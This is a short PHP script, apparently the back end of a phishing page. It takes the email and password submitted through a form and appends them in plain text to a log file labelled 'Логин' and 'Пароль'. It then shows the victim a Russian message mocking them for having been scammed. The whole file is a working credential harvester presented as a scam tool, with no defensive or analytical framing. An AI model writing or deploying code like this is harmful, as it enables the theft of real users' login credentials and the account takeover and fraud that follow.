<?php
	$log = fopen("log.txt", "a");
	fwrite($log, "Логин: " . $_POST["email"] . " Пароль: " . $_POST["pass"] . "\n");
	fclose($log);
	echo "Братан, тебя заскамили!";
?>